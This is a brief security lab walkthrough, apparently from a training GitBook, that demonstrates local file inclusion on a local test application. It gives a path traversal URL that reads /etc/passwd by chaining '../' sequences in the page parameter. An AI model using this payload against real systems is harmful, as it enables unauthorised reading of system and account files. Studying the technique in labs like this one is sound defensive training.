# Extracting User Accounts with Local File Inclusion

## Lab 20: Insecure Direct Object References - Extracting User Accounts with Local File Inclusion

<figure><img src="../../.gitbook/assets/image (28) (1) (1).png" alt=""><figcaption></figcaption></figure>

Go to directory browsing page: [https://127.0.0.1/index.php?page=directory-browsing.php](https://127.0.0.1/index.php?page=directory-browsing.php)

<figure><img src="../../.gitbook/assets/image (42) (1) (1).png" alt=""><figcaption></figcaption></figure>

and change the reference value of attribute with: multiple sequence of `../` to go in the previous directory (6 or 7 should be enough) + `/etc/passwd`

[https://127.0.0.1/index.php?page=../../../../../../../etc/passwd](https://127.0.0.1/index.php?page=../../../../../../../etc/passwd)

<figure><img src="../../.gitbook/assets/image (44) (1) (1).png" alt=""><figcaption></figcaption></figure>
